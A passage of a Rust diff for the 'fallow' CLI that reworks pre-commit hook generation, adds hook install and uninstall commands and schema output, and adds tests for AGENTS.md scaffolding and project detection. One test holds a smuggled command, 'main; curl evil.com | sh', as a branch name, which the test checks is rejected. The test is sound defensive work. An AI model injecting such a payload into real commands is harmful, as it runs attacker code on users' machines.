     }
 
-    // Determine the base ref: explicit --branch > detected default branch > "main"
-    let base_ref = branch
+    let fallback_base_ref = branch
         .map(String::from)
         .or_else(|| detect_default_branch(root))
         .unwrap_or_else(|| "main".to_string());
 
-    let hook_content = format!(
-        "#!/bin/sh\n\
-         # fallow pre-commit hook -- catch dead code before it merges\n\
-         # Remove or edit this file to change the hook behavior.\n\
-         # Bypass on a single commit with: git commit --no-verify\n\
-         \n\
-         command -v fallow >/dev/null 2>&1 || exit 0\n\
-         fallow dead-code --changed-since {base_ref} --fail-on-issues --quiet\n"
-    );
+    let hook_content = build_pre_commit_hook_content(&fallback_base_ref);
 
-    // Detect hook target: husky > lefthook > simple-git-hooks > bare .git/hooks
-    enum HookTarget {
-        Husky(std::path::PathBuf),
-        Lefthook,
-        GitHooks(std::path::PathBuf),
-    }
-
-    let target = if root.join(".husky").is_dir() {
-        HookTarget::Husky(root.join(".husky/pre-commit"))
-    } else if root.join(".lefthook").is_dir()
-        || root.join("lefthook.yml").exists()
-        || root.join("lefthook.json").exists()
-    {
-        HookTarget::Lefthook
-    } else if root.join(".git/hooks").is_dir() {
-        HookTarget::GitHooks(root.join(".git/hooks/pre-commit"))
-    } else {
-        eprintln!(
-            "Error: No .git directory found. Run `git init` first, or use --hooks \
-             from the repository root."
-        );
-        return ExitCode::from(2);
+    let target = match detect_hook_target(root) {
+        Ok(target) => target,
+        Err(code) => return code,
     };
 
     match target {
         HookTarget::Husky(hook_path) => {
-            if hook_path.exists() {
-                eprintln!(
-                    "Error: .husky/pre-commit already exists. \
-                     Add the following line to your existing hook:\n\n  \
-                     fallow dead-code --changed-since {base_ref} --fail-on-issues --quiet"
-                );
-                return ExitCode::from(2);
+            if let Err(code) = install_hook_file(
+                &hook_path,
+                ".husky/pre-commit",
+                &hook_content,
+                &fallback_base_ref,
+                opts,
+            ) {
+                return code;
             }
-            if let Err(e) = write_hook(&hook_path, &hook_content) {
-                eprintln!("Error: Failed to write .husky/pre-commit: {e}");
-                return ExitCode::from(2);
-            }
-            eprintln!("Created .husky/pre-commit");
         }
         HookTarget::Lefthook => {
-            eprintln!(
-                "Lefthook detected. Add the following to your lefthook.yml:\n\n  \
-                 pre-commit:\n    commands:\n      fallow:\n        \
-                 run: fallow dead-code --changed-since {base_ref} --fail-on-issues --quiet"
-            );
+            eprintln!("{}", lefthook_hint(&fallback_base_ref));
             return ExitCode::SUCCESS;
         }
         HookTarget::GitHooks(hook_path) => {
-            if hook_path.exists() {
-                eprintln!(
-                    "Error: .git/hooks/pre-commit already exists. \
-                     Add the following line to your existing hook:\n\n  \
-                     fallow dead-code --changed-since {base_ref} --fail-on-issues --quiet"
-                );
-                return ExitCode::from(2);
+            if let Err(code) = install_hook_file(
+                &hook_path,
+                ".git/hooks/pre-commit",
+                &hook_content,
+                &fallback_base_ref,
+                opts,
+            ) {
+                return code;
             }
-            if let Err(e) = write_hook(&hook_path, &hook_content) {
-                eprintln!("Error: Failed to write .git/hooks/pre-commit: {e}");
-                return ExitCode::from(2);
-            }
-            eprintln!("Created .git/hooks/pre-commit");
         }
     }
 
-    eprintln!("\nThe hook runs `fallow dead-code` on files changed since `{base_ref}`.");
+    eprintln!(
+        "\nThe hook runs `fallow audit` against the merge-base with the current branch upstream, \
+         falling back to `{fallback_base_ref}` when no upstream is set (gate=new-only by default)."
+    );
     eprintln!("To skip the hook on a single commit: git commit --no-verify");
     ExitCode::SUCCESS
+}
+
+/// Render the managed pre-commit hook script body for the given fallback base ref.
+fn build_pre_commit_hook_content(fallback_base_ref: &str) -> String {
+    format!(
+        r#"#!/bin/sh
+{GIT_HOOK_MARKER}
+# fallow pre-commit hook -- gate commits on dead code, complexity, duplication, and styling.
+# Audit defaults to gate=new-only, so inherited findings on touched files do not block
+# commits; only findings introduced by the changeset fail the gate. Set audit.gate = "all"
+# in fallow.toml to fail on every finding in changed files.
+# Remove or edit this file to change the hook behavior.
+# Bypass on a single commit with: git commit --no-verify
+
+command -v fallow >/dev/null 2>&1 || exit 0
+UPSTREAM="$(git rev-parse --abbrev-ref --symbolic-full-name '@{{upstream}}' 2>/dev/null || true)"
+if [ -n "$UPSTREAM" ]; then
+  # Diff against the merge-base with the upstream so feature branches forked off
+  # a non-default integration branch (next-release / hotfix / LTS) compare
+  # against the right base, not against their own remote tracking branch.
+  BASE="$(git merge-base "$UPSTREAM" HEAD 2>/dev/null || echo "$UPSTREAM")"
+else
+  BASE="{fallback_base_ref}"
+fi
+fallow audit --base "$BASE" --quiet --gate-marker pre-commit
+"#
+    )
+}
+
+/// Write (or preview) the managed hook at `hook_path`, refusing to clobber
+/// an existing hook unless `--force`. `label` is the user-facing path shown
+/// in messages. Returns `Err(exit_code)` on a conflict or write failure.
+fn install_hook_file(
+    hook_path: &Path,
+    label: &str,
+    hook_content: &str,
+    fallback_base_ref: &str,
+    opts: &GitHooksInstallOptions<'_>,
+) -> Result<(), ExitCode> {
+    let existed = hook_path.exists();
+    if existed && !opts.force {
+        eprintln!("{}", existing_hook_hint(label, fallback_base_ref));
+        return Err(ExitCode::from(2));
+    }
+    if opts.dry_run {
+        if existed {
+            eprintln!("Would overwrite {label}");
+        } else {
+            eprintln!("Would create {label}");
+        }
+    } else if let Err(e) = write_hook(hook_path, hook_content) {
+        eprintln!("Error: Failed to write {label}: {e}");
+        return Err(ExitCode::from(2));
+    } else {
+        eprintln!("{} {label}", if existed { "Updated" } else { "Created" });
+    }
+    Ok(())
+}
+
+pub fn run_git_hooks_uninstall(opts: &GitHooksUninstallOptions<'_>) -> ExitCode {
+    let target = match detect_hook_target(opts.root) {
+        Ok(target) => target,
+        Err(code) => return code,
+    };
+
+    let hook_path = match target {
+        HookTarget::Husky(path) | HookTarget::GitHooks(path) => path,
+        HookTarget::Lefthook => {
+            eprintln!(
+                "Lefthook detected. Remove the fallow command from your lefthook.yml manually."
+            );
+            return ExitCode::SUCCESS;
+        }
+    };
+
+    if !hook_path.exists() {
+        eprintln!(
+            "{} unchanged (not present)",
+            display_hook_path(opts.root, &hook_path)
+        );
+        return ExitCode::SUCCESS;
+    }
+
+    let content = match std::fs::read_to_string(&hook_path) {
+        Ok(content) => content,
+        Err(e) => {
+            eprintln!(
+                "Error: Failed to read {}: {e}",
+                display_hook_path(opts.root, &hook_path)
+            );
+            return ExitCode::from(2);
+        }
+    };
+
+    if !content.contains(GIT_HOOK_MARKER) && !opts.force {
+        eprintln!(
+            "Error: {} was not generated by fallow. Re-run with --force to remove it anyway.",
+            display_hook_path(opts.root, &hook_path)
+        );
+        return ExitCode::from(2);
+    }
+
+    if opts.dry_run {
+        eprintln!("Would remove {}", display_hook_path(opts.root, &hook_path));
+        return ExitCode::SUCCESS;
+    }
+
+    if let Err(e) = std::fs::remove_file(&hook_path) {
+        eprintln!(
+            "Error: Failed to remove {}: {e}",
+            display_hook_path(opts.root, &hook_path)
+        );
+        return ExitCode::from(2);
+    }
+
+    eprintln!("Removed {}", display_hook_path(opts.root, &hook_path));
+    ExitCode::SUCCESS
+}
+
+fn display_hook_path(root: &Path, path: &Path) -> String {
+    path.strip_prefix(root)
+        .map_or_else(|_| path.display().to_string(), |p| p.display().to_string())
 }
 
 /// Write a hook file and set the executable permission on Unix.
@@ -497,9 +1079,9 @@ fn write_hook(path: &Path, content: &str) -> std::io::Result<()> {
     Ok(())
 }
 
-pub fn run_config_schema() -> ExitCode {
+pub fn run_config_schema(json_style: crate::json_style::JsonStyle) -> ExitCode {
     let schema = FallowConfig::json_schema();
-    match serde_json::to_string_pretty(&schema) {
+    match json_style.serialize(&schema) {
         Ok(json) => {
             println!("{json}");
             ExitCode::SUCCESS
@@ -511,15 +1093,29 @@ pub fn run_config_schema() -> ExitCode {
     }
 }
 
-pub fn run_plugin_schema() -> ExitCode {
+pub fn run_plugin_schema(json_style: crate::json_style::JsonStyle) -> ExitCode {
     let schema = ExternalPluginDef::json_schema();
-    match serde_json::to_string_pretty(&schema) {
+    match json_style.serialize(&schema) {
         Ok(json) => {
             println!("{json}");
             ExitCode::SUCCESS
         }
         Err(e) => {
             eprintln!("Error: failed to serialize plugin schema: {e}");
+            ExitCode::from(2)
+        }
+    }
+}
+
+pub fn run_rule_pack_schema(json_style: crate::json_style::JsonStyle) -> ExitCode {
+    let schema = fallow_config::RulePackDef::json_schema();
+    match json_style.serialize(&schema) {
+        Ok(json) => {
+            println!("{json}");
+            ExitCode::SUCCESS
+        }
+        Err(e) => {
+            eprintln!("Error: failed to serialize rule pack schema: {e}");
             ExitCode::from(2)
         }
     }
@@ -533,8 +1129,23 @@ mod tests {
         InitOptions {
             root,
             use_toml,
+            agents: false,
             hooks: false,
             branch: None,
+            decline: false,
+            quiet: false,
+        }
+    }
+
+    fn agents_opts(root: &Path) -> InitOptions<'_> {
+        InitOptions {
+            root,
+            use_toml: false,
+            agents: true,
+            hooks: false,
+            branch: None,
+            decline: false,
+            quiet: false,
         }
     }
 
@@ -542,9 +1153,17 @@ mod tests {
         InitOptions {
             root,
             use_toml: false,
+            agents: false,
             hooks: true,
             branch,
+            decline: false,
+            quiet: false,
         }
+    }
+
+    fn parse_jsonc_config(content: &str) -> serde_json::Value {
+        jsonc_parser::parse_to_serde_value(content, &jsonc_parser::ParseOptions::default())
+            .expect("parse generated jsonc")
     }
 
     #[test]
@@ -602,14 +1221,40 @@ mod tests {
     }
 
     #[test]
-    fn init_json_config_is_valid_json() {
+    fn init_json_config_is_valid_jsonc() {
         let dir = tempfile::tempdir().unwrap();
         let root = dir.path();
         run_init(&config_opts(root, false));
         let content = std::fs::read_to_string(root.join(".fallowrc.json")).unwrap();
-        let parsed: serde_json::Value = serde_json::from_str(&content).unwrap();
+        let parsed = parse_jsonc_config(&content);
         assert!(parsed.is_object());
         assert!(parsed["$schema"].is_string());
+        assert!(content.contains("// Common additions (uncomment to enable):"));
+    }
+
+    #[test]
+    fn init_json_template_writes_min_occurrences_three() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        run_init(&config_opts(root, false));
+        let content = std::fs::read_to_string(root.join(".fallowrc.json")).unwrap();
+        let parsed = parse_jsonc_config(&content);
+        assert_eq!(
+            parsed["duplicates"]["minOccurrences"], 3,
+            "fresh installs default minOccurrences to 3 to hide pair-only noise"
+        );
+    }
+
+    #[test]
+    fn init_toml_template_writes_min_occurrences_three() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        run_init(&config_opts(root, true));
+        let content = std::fs::read_to_string(root.join("fallow.toml")).unwrap();
+        assert!(
+            content.contains("minOccurrences = 3"),
+            "fresh installs default minOccurrences to 3 to hide pair-only noise"
+        );
     }
 
     #[test]
@@ -634,13 +1279,287 @@ mod tests {
     fn init_existing_config_blocks_both_formats() {
         let dir = tempfile::tempdir().unwrap();
         let root = dir.path();
-        // Existing .fallowrc.json should block both JSON and TOML creation
         std::fs::write(root.join(".fallowrc.json"), "{}").unwrap();
         assert_eq!(run_init(&config_opts(root, false)), ExitCode::from(2));
         assert_eq!(run_init(&config_opts(root, true)), ExitCode::from(2));
     }
 
-    // ── Hook tests ─────────────────────────────────────────────────
+    #[test]
+    fn init_agents_creates_agents_guide() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let path = root.join("AGENTS.md");
+        assert!(path.exists());
+        let content = std::fs::read_to_string(&path).unwrap();
+        assert!(content.contains("# AGENTS.md"));
+        assert!(content.contains("Project Overview"));
+        assert!(content.contains("fallow audit --format json --quiet"));
+        // The task-to-command matrix renders into the scaffolded guide.
+        assert!(content.contains("When the agent is about to"));
+        assert!(content.contains("fallow dead-code --trace <file>:<export>"));
+        assert!(content.contains("<!-- generated:task-matrix:start -->"));
+        assert!(!root.join(".fallowrc.json").exists());
+        assert!(!root.join("fallow.toml").exists());
+    }
+
+    #[test]
+    fn init_agents_refuses_to_overwrite_existing_guide() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(root.join("AGENTS.md"), "# Existing guide\n").unwrap();
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::from(2));
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        assert_eq!(content, "# Existing guide\n");
+    }
+
+    #[test]
+    fn init_agents_template_is_not_a_readiness_score() {
+        // Static template baseline.
+        let template = AGENTS_GUIDE_TEMPLATE.to_lowercase();
+        assert!(!template.contains("readiness"));
+        assert!(!template.contains("score"));
+        assert!(!template.contains("grade"));
+
+        // Fully-prefilled output (fixture 1 equivalent).
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("pnpm-workspace.yaml"),
+            "packages:\n  - 'packages/*'\n",
+        )
+        .unwrap();
+        std::fs::write(root.join("tsconfig.json"), "{}").unwrap();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"devDependencies": {"vitest": "^1"}}"#,
+        )
+        .unwrap();
+        let info = detect_project(root);
+        let generated = build_agents_guide(&info).to_lowercase();
+        assert!(!generated.contains("readiness"));
+        assert!(!generated.contains("score"));
+        assert!(!generated.contains("grade"));
+
+        // Empty-project output (fixture 4 equivalent).
+        let empty_info = ProjectInfo {
+            is_monorepo: false,
+            workspace_patterns: Vec::new(),
+            workspace_tool: None,
+            has_typescript: false,
+            test_framework: None,
+            ui_framework: None,
+            has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
+        };
+        let empty_generated = build_agents_guide(&empty_info).to_lowercase();
+        assert!(!empty_generated.contains("readiness"));
+        assert!(!empty_generated.contains("score"));
+        assert!(!empty_generated.contains("grade"));
+    }
+
+    #[test]
+    fn agents_guide_prefills_monorepo_pnpm_vitest() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("pnpm-workspace.yaml"),
+            "packages:\n  - 'packages/*'\n",
+        )
+        .unwrap();
+        std::fs::write(root.join("tsconfig.json"), "{}").unwrap();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"devDependencies": {"vitest": "^1"}}"#,
+        )
+        .unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+
+        assert!(content.contains("- Install: pnpm install"), "Install line");
+        assert!(content.contains("- Test: Vitest"), "Test line");
+        assert!(
+            content.contains("- Typecheck or lint: tsc --noEmit"),
+            "Typecheck line"
+        );
+        assert!(
+            content.contains("- Module boundaries: pnpm workspaces (packages/*)"),
+            "Module boundaries line"
+        );
+        assert!(
+            content.contains(
+                "<!-- fallow init prefilled these from package.json; confirm before relying on them -->"
+            ),
+            "Provenance comment"
+        );
+        // Primary app stays blank.
+        assert!(
+            content.contains("- Primary app or package:"),
+            "Primary app blank"
+        );
+        let primary_line = content
+            .lines()
+            .find(|l| l.contains("Primary app or package:"))
+            .unwrap();
+        assert_eq!(
+            primary_line.trim(),
+            "- Primary app or package:",
+            "Primary app line must have nothing after the colon"
+        );
+        // No UI framework or Storybook lines.
+        assert!(!content.contains("UI framework"), "No UI framework line");
+        assert!(!content.contains("Storybook"), "No Storybook line");
+    }
+
+    #[test]
+    fn agents_guide_respects_package_manager_field() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"packageManager": "yarn@4.1.0"}"#,
+        )
+        .unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        assert!(
+            content.contains("- Install: yarn install"),
+            "yarn from packageManager field"
+        );
+    }
+
+    #[test]
+    fn agents_guide_ambiguous_test_framework_stays_blank() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"devDependencies": {"vitest": "^1", "jest": "^29"}}"#,
+        )
+        .unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        // Test line must be blank (just "- Test:" with nothing after the colon).
+        let test_line = content
+            .lines()
+            .find(|l| l.trim_start().starts_with("- Test:"))
+            .expect("- Test: line should be present");
+        assert_eq!(
+            test_line.trim(),
+            "- Test:",
+            "Ambiguous test framework must leave - Test: blank"
+        );
+    }
+
+    #[test]
+    fn agents_guide_bun_workspace_stays_tool_neutral() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        // Bun-shaped workspace: package.json `workspaces` + bun.lock, no
+        // packageManager field, no pnpm-workspace.yaml. workspace_tool falls
+        // back to "npm", which must NOT leak into the scaffold.
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"workspaces": ["packages/*"]}"#,
+        )
+        .unwrap();
+        std::fs::write(root.join("bun.lock"), "{}").unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        assert!(
+            content.contains("- Module boundaries: workspaces (packages/*)"),
+            "tool-neutral boundaries label, got: {content}"
+        );
+        assert!(
+            !content.contains("npm workspaces"),
+            "lockfile-default npm label must not appear"
+        );
+    }
+
+    #[test]
+    fn agents_guide_package_manager_labels_boundaries() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"workspaces": ["packages/*"], "packageManager": "bun@1.2.0"}"#,
+        )
+        .unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        assert!(
+            content.contains("- Module boundaries: bun workspaces (packages/*)"),
+            "packageManager field labels boundaries, got: {content}"
+        );
+        assert!(content.contains("- Install: bun install"), "Install line");
+    }
+
+    #[test]
+    fn agents_guide_empty_project_keeps_placeholders() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        // Empty fixture: no files at all.
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        // Must be byte-identical to the static template.
+        assert_eq!(
+            content, AGENTS_GUIDE_TEMPLATE,
+            "Empty-project output must be byte-identical to the static AGENTS_GUIDE_TEMPLATE"
+        );
+        // No provenance comment when nothing was prefilled.
+        assert!(
+            !content.contains("fallow init prefilled"),
+            "No provenance comment for empty project"
+        );
+    }
+
+    #[test]
+    fn detect_test_framework_ambiguous_vitest_and_jest() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"devDependencies": {"vitest": "^1", "jest": "^29"}}"#,
+        )
+        .unwrap();
+        let info = detect_project(dir.path());
+        assert!(
+            info.test_framework_ambiguous,
+            "both vitest and jest present => ambiguous"
+        );
+        // test_framework still holds the first-match value.
+        assert_eq!(info.test_framework.as_deref(), Some("Vitest"));
+    }
+
+    #[test]
+    fn detect_package_manager_field() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"packageManager": "pnpm@9.0.0"}"#,
+        )
+        .unwrap();
+        let info = detect_project(dir.path());
+        assert_eq!(
+            info.package_manager.as_deref(),
+            Some("pnpm"),
+            "packageManager parsed to just the manager name"
+        );
+    }
 
     #[test]
     fn hooks_fails_without_git_dir() {
@@ -660,10 +1579,15 @@ mod tests {
         let hook_path = root.join(".git/hooks/pre-commit");
         assert!(hook_path.exists());
         let content = std::fs::read_to_string(&hook_path).unwrap();
-        assert!(content.contains("fallow dead-code"));
-        assert!(content.contains("--changed-since"));
-        assert!(content.contains("--fail-on-issues"));
+        assert!(content.contains("fallow audit"));
+        assert!(content.contains("fallow audit --base \"$BASE\" --quiet"));
+        assert!(content.contains(GIT_HOOK_MARKER));
+        assert!(content.contains("@{upstream}"));
+        assert!(content.contains("git merge-base \"$UPSTREAM\" HEAD"));
+        assert!(content.contains("BASE=\"main\""));
         assert!(content.contains("command -v fallow"));
+        assert!(content.contains("gate=new-only"));
+        assert!(content.contains("\n  BASE=\""));
     }
 
     #[test]
@@ -674,7 +1598,9 @@ mod tests {
         let exit = run_init(&hooks_opts(root, Some("develop")));
         assert_eq!(exit, ExitCode::SUCCESS);
         let content = std::fs::read_to_string(root.join(".git/hooks/pre-commit")).unwrap();
-        assert!(content.contains("--changed-since develop"));
+        assert!(content.contains("BASE=\"develop\""));
+        assert!(!content.contains("--base develop"));
+        assert!(content.contains("fallow audit --base \"$BASE\" --quiet"));
     }
 
     #[test]
@@ -685,8 +1611,14 @@ mod tests {
         std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
         let exit = run_init(&hooks_opts(root, None));
         assert_eq!(exit, ExitCode::SUCCESS);
-        assert!(root.join(".husky/pre-commit").exists());
+        let husky_hook = root.join(".husky/pre-commit");
+        assert!(husky_hook.exists());
         assert!(!root.join(".git/hooks/pre-commit").exists());
+        let content = std::fs::read_to_string(&husky_hook).unwrap();
+        assert!(content.contains(GIT_HOOK_MARKER));
+        assert!(content.contains("@{upstream}"));
+        assert!(content.contains("git merge-base \"$UPSTREAM\" HEAD"));
+        assert!(content.contains("fallow audit --base \"$BASE\" --quiet"));
     }
 
     #[test]
@@ -700,11 +1632,99 @@ mod tests {
     }
 
     #[test]
+    fn existing_hook_hint_includes_resolution_block() {
+        let hint = existing_hook_hint(".git/hooks/pre-commit", "main");
+        assert!(hint.contains(".git/hooks/pre-commit already exists"));
+        assert!(hint.contains("command -v fallow"));
+        assert!(hint.contains("@{upstream}"));
+        assert!(hint.contains("git merge-base \"$UPSTREAM\" HEAD"));
+        assert!(hint.contains("BASE=\"main\""));
+        assert!(hint.contains("fallow audit --base \"$BASE\" --quiet"));
+    }
+
+    #[test]
+    fn lefthook_hint_includes_resolution_block() {
+        let hint = lefthook_hint("develop");
+        assert!(hint.contains("Lefthook detected"));
+        assert!(hint.contains("pre-commit:"));
+        assert!(hint.contains("run: |"));
+        assert!(hint.contains("@{upstream}"));
+        assert!(hint.contains("git merge-base \"$UPSTREAM\" HEAD"));
+        assert!(hint.contains("BASE=\"develop\""));
+        assert!(hint.contains("fallow audit --base \"$BASE\" --quiet"));
+    }
+
+    #[test]
+    fn git_hooks_uninstall_removes_managed_hook() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
+        assert_eq!(
+            run_git_hooks_install(&GitHooksInstallOptions {
+                root,
+                branch: None,
+                dry_run: false,
+                force: false,
+            }),
+            ExitCode::SUCCESS
+        );
+
+        let hook_path = root.join(".git/hooks/pre-commit");
+        assert!(hook_path.exists());
+        assert_eq!(
+            run_git_hooks_uninstall(&GitHooksUninstallOptions {
+                root,
+                dry_run: false,
+                force: false,
+            }),
+            ExitCode::SUCCESS
+        );
+        assert!(!hook_path.exists());
+    }
+
+    #[test]
+    fn git_hooks_uninstall_preserves_user_hook_without_force() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
+        let hook_path = root.join(".git/hooks/pre-commit");
+        std::fs::write(&hook_path, "#!/bin/sh\necho user\n").unwrap();
+
+        assert_eq!(
+            run_git_hooks_uninstall(&GitHooksUninstallOptions {
+                root,
+                dry_run: false,
+                force: false,
+            }),
+            ExitCode::from(2)
+        );
+        assert!(hook_path.exists());
+    }
+
+    #[test]
+    fn git_hooks_uninstall_force_removes_user_hook() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
+        let hook_path = root.join(".git/hooks/pre-commit");
+        std::fs::write(&hook_path, "#!/bin/sh\necho user\n").unwrap();
+
+        assert_eq!(
+            run_git_hooks_uninstall(&GitHooksUninstallOptions {
+                root,
+                dry_run: false,
+                force: true,
+            }),
+            ExitCode::SUCCESS
+        );
+        assert!(!hook_path.exists());
+    }
+
+    #[test]
     fn hooks_detects_lefthook() {
         let dir = tempfile::tempdir().unwrap();
         let root = dir.path();
         std::fs::write(root.join("lefthook.yml"), "").unwrap();
-        // lefthook mode prints instructions and succeeds without writing a file
         let exit = run_init(&hooks_opts(root, None));
         assert_eq!(exit, ExitCode::SUCCESS);
     }
@@ -732,11 +1752,8 @@ mod tests {
         std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
         let exit = run_init(&hooks_opts(root, Some("main; curl evil.com | sh")));
         assert_eq!(exit, ExitCode::from(2));
-        // Hook file should NOT have been written
         assert!(!root.join(".git/hooks/pre-commit").exists());
     }
-
-    // ── Gitignore tests ────────────────────────────────────────────
 
     #[test]
     fn init_creates_gitignore_with_fallow_entry() {
@@ -775,7 +1792,6 @@ mod tests {
         std::fs::write(root.join(".gitignore"), ".fallow\n").unwrap();
         run_init(&config_opts(root, false));
         let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
-        // Should not add a duplicate — .fallow already covers the directory
         assert_eq!(content.matches(".fallow").count(), 1);
     }
 
@@ -798,8 +1814,6 @@ mod tests {
         assert!(content.contains(".fallow/"));
     }
 
-    // ── Project detection tests ────────────────────────────────────
-
     #[test]
     fn detect_empty_project() {
         let dir = tempfile::tempdir().unwrap();
@@ -810,6 +1824,27 @@ mod tests {
         assert!(info.workspace_tool.is_none());
         assert!(info.test_framework.is_none());
         assert!(info.ui_framework.is_none());
+        assert!(!info.has_local_schema);
+    }
+
+    /// Issue #1794: `detect_project` must flag a local schema only when
+    /// `node_modules/fallow/schema.json` actually exists, so `fallow init`
+    /// and `fallow recommend` never emit a local `$schema` path that fails
+    /// to resolve in an editor.
+    #[test]
+    fn detect_local_schema_present() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join("node_modules/fallow")).unwrap();
+        std::fs::write(dir.path().join("node_modules/fallow/schema.json"), "{}").unwrap();
+        let info = detect_project(dir.path());
+        assert!(info.has_local_schema);
+    }
+
+    #[test]
+    fn detect_local_schema_absent_without_node_modules() {
+        let dir = tempfile::tempdir().unwrap();
+        let info = detect_project(dir.path());
+        assert!(!info.has_local_schema);
     }
 
     #[test]
@@ -832,6 +1867,39 @@ mod tests {
         assert!(info.is_monorepo);
         assert_eq!(info.workspace_tool.as_deref(), Some("pnpm"));
         assert_eq!(info.workspace_patterns, vec!["packages/*"]);
+    }
+
+    #[test]
+    fn detect_project_aggregates_workspace_member_frameworks() {
+        // A pnpm monorepo whose framework lives in a workspace member, not the
+        // root package.json (the common shape). Root has only tooling; the
+        // Next.js app is in apps/web. Root-only detection would miss it.
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"private":true,"devDependencies":{"typescript":"^5"}}"#,
+        )
+        .unwrap();
+        std::fs::write(
+            root.join("pnpm-workspace.yaml"),
+            "packages:\n  - 'apps/*'\n",
+        )
+        .unwrap();
+        std::fs::create_dir_all(root.join("apps/web")).unwrap();
+        std::fs::write(
+            root.join("apps/web/package.json"),
+            r#"{"name":"@acme/web","dependencies":{"next":"^14","react":"^18"}}"#,
+        )
+        .unwrap();
+
+        let info = detect_project(root);
+        assert!(info.is_monorepo);
+        assert_eq!(
+            info.ui_framework.as_deref(),
+            Some("React"),
+            "a framework in a workspace member must be detected, not just root deps"
+        );
     }
 
     #[test]
@@ -940,8 +2008,6 @@ mod tests {
         assert_eq!(info.test_framework.as_deref(), Some("Playwright"));
     }
 
-    // ── Config generation tests ────────────────────────────────────
-
     #[test]
     fn json_config_empty_project_is_valid() {
         let info = ProjectInfo {
@@ -952,14 +2018,87 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
         };
         let json = build_json_config(&info);
-        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
+        let parsed = parse_jsonc_config(&json);
         assert!(parsed["$schema"].is_string());
         assert!(parsed["entry"].is_array());
+        assert!(parsed["duplicates"].is_object());
         assert!(parsed["rules"].is_object());
-        // JS extensions for non-TS project
         assert!(json.contains("{js,jsx,mjs}"));
+    }
+
+    /// Issue #1794: end-to-end through `build_json_config` (what `fallow init`
+    /// actually writes), without a local schema the emitted `$schema` is the
+    /// remote GitHub URL.
+    #[test]
+    fn json_config_schema_is_remote_without_local_schema() {
+        let info = ProjectInfo {
+            is_monorepo: false,
+            workspace_patterns: Vec::new(),
+            workspace_tool: None,
+            has_typescript: false,
+            test_framework: None,
+            ui_framework: None,
+            has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: false,
+        };
+        let json = build_json_config(&info);
+        let parsed = parse_jsonc_config(&json);
+        assert_eq!(
+            parsed["$schema"],
+            "https://raw.githubusercontent.com/fallow-rs/fallow/main/schema.json"
+        );
+    }
+
+    /// Issue #1794: end-to-end through `build_json_config`, with a local
+    /// schema detected the emitted `$schema` is the local npm-package path.
+    #[test]
+    fn json_config_schema_is_local_when_detected() {
+        let info = ProjectInfo {
+            is_monorepo: false,
+            workspace_patterns: Vec::new(),
+            workspace_tool: None,
+            has_typescript: false,
+            test_framework: None,
+            ui_framework: None,
+            has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+            has_local_schema: true,
+        };
+        let json = build_json_config(&info);
+        let parsed = parse_jsonc_config(&json);
+        assert_eq!(parsed["$schema"], "./node_modules/fallow/schema.json");
+    }
+
+    #[test]
+    fn init_json_has_jsonc_provenance_header() {
